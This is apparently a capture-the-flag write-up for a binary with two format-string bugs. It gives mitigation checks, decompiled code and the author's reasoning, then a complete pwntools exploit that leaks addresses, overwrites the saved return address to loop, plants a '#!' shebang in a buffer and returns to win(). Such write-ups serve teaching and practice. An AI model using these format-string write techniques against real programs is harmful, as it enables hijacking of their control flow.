### I. check mitigation
```D
Arch:     amd64
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
RUNPATH:    b'.'
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```
### II. IDA
```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  setbuf(stdin, 0LL);
  setbuf(_bss_start, 0LL);
  vuln();
  return 0;
}
unsigned __int64 vuln()
{
  char s[32]; // [rsp+10h] [rbp-50h] BYREF
  char format[40]; // [rsp+30h] [rbp-30h] BYREF
  unsigned __int64 v3; // [rsp+58h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Enter your first name: ");
  fgets(s, 28, stdin);
  s[strcspn(s, "\n")] = 0;
  printf("You entered ");
  printf(s);                                    // fmtstr
  putchar(10);
  printf("Enter your last name: ");
  fgets(format, 28, stdin);
  format[strcspn(format, "\n")] = 0;
  printf("You entered ");
  printf(format);                               // fmtstr
  putchar(10);
  return v3 - __readfsqword(0x28u);
}
void __noreturn win()
{
  int fd; // [rsp+4h] [rbp-1Ch]
  char *argv; // [rsp+8h] [rbp-18h] BYREF
  char *envp[2]; // [rsp+10h] [rbp-10h] BYREF

  envp[1] = (char *)__readfsqword(0x28u);
  fd = memfd_create("payload", 0LL);
  if ( fd == -1 )
  {
    perror("memfd_create");
    exit(1);
  }
  if ( write(fd, &buffer, 0x94uLL) != 0x94 )
  {
    perror("write");
    exit(1);
  }
  argv = 0LL;
  envp[0] = 0LL;
  fexecve(fd, &argv, envp);
  perror("fexecve");
  exit(1);
}
.bss:0000000000004040                 public buffer
.bss:0000000000004040 buffer          db    ? ;               ; DATA XREF: win+59↑o
```
### III. analyze
- there are clearly 2 fmtstr bugs and no bof
- since input allows only 28 bytes, we need to find a way to create a loop (and i think it applies to most of fmtstr challs)
- PIE on, full relro and a `win()` func -> leak PIE and stack by fmtstr bugs to overwrite saved rip and ret2win (we dont need libc, but im too lazy to rm from script :D) 
- w first bug, i will use to leak and the second used to create loop
- i overwrite saved rip w addr at `call vuln()` in `main()` as it doesnt change stack frame (after many attempts)
- look at, `win()`:
```C
fd = memfd_create("payload", 0LL);
if ( write(fd, &buffer, 0x94uLL) != 0x94 )
  {
    perror("write");
    exit(1);
  }
  argv = 0LL;
  envp[0] = 0LL;
  fexecve(fd, &argv, envp);
```
- `memfd_create` creates a file in memory and write data from buffer to file descriptor `fd`
- `fexecve` execv w the `fd` as first arg
- so the idea is to modify `buffer` so that it will take that as arg for `fexecve`
- at first, i tried to set `buffer = b'/bin/sh'` and it returned `Exec format str` error. i shifted to put a ropchain, but cant pivot stack by saved rbp overwrite either
- after some researches, i found this wu: https://ctftime.org/writeup/37692
- it turns out to use `fexecve()`, buffer needs to start w `#!`
- i tested some like `#!/bin/bash` or `#!/bin/sh` as wu but neither did they work (not `#!/bin/cat flag.*` too, mayb bc of the `*` ?)
- in the end, `#!/bin/cat flag.txt` worked
- i rcm using a loop to change `buffer`, first bug to write arbitrary and the second to ret2win
- after that, overwrite saved rip to `win()` and we got shell

-> overall, since we have only 2 fmtstr bugs w limited bytes input, PIE on, a `win()`, `fexecv()`, the path will be:
**leak PIE and stack -> create loop by overwriting saved rip -> modify first arg of `fexecv()` w format `#!` -> ret2win**
### IV. PoC
```python
#!/usr/bin/env python3
from pwn import *
import binascii
import sys

exe_path = 'main_patched'
HOST = 'example.com'
PORT = 1337

exe = ELF(exe_path, checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
brva 0x1352
brva 0x139f
brva 0x1415
c
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe.path)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        input()
    return p

p = start()

def sla(prompt, data):
    p.sendlineafter(prompt, data)
def sa(prompt, data):
    p.sendafter(prompt, data)
def s(prompt):
    p.send(prompt)
def sl(data):
    p.sendline(data)

# ============================EXPLOIT============================
# leak stack and pie
payload = b'%18$p|%19$p|%21$p'
sla(b'first name: ', payload)
p.recvuntil(b'entered ')
srip = int(p.recv(14), 16)-0x8
p.recvuntil(b'|')
pie = int(p.recv(14), 16)-0x14b5
p.recvuntil(b'|')
libc.address = int(p.recv(14), 16)-0x29f75

# back to vuln
vuln = pie+0x14b0
padding = int(vuln & 0xffff)
payload = f'%{padding}c%14$hn'.encode().ljust(16, b'\x00') + p64(srip)
sla(b'last name: ', payload)

# gadgets
leave_ret = 0x0000000000001479 + pie
ret = 0x0000000000001273 + pie
pop_rbp = 0x0000000000001273 + pie

# input binsh in buf
buf = pie+0x4040
fd = [0x23, 0x21, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x63, 0x61, 0x74, 0x20, 0x66, 0x6c, 0x61, 0x67, 0x2e, 0x74, 0x78, 0x74, 0x0] #pwndbg> p/x "#!/bin/cat flag.txt"

for i in range(0, len(fd)//2):
    ch = int(fd[i*2+1] << 8 | fd[i*2])
    payload = f'%{ch}c%10$hn'.encode().ljust(16, b'\x00') + p64(buf+i*2)
    sla(b'first name: ', payload)

    padding = int(vuln & 0xffff)
    payload = f'%{padding}c%14$hn'.encode().ljust(16, b'\x00') + p64(srip)
    sla(b'last name: ', payload)

win = pie + 0x1289 + 5
padding = int(win & 0xffff)
payload = f'%{padding}c%10$hn'.encode().ljust(16, b'\x00') + p64(srip)
sla(b'first name: ', payload)

sla(b'last name: ', b'DTM')

p.interactive()
```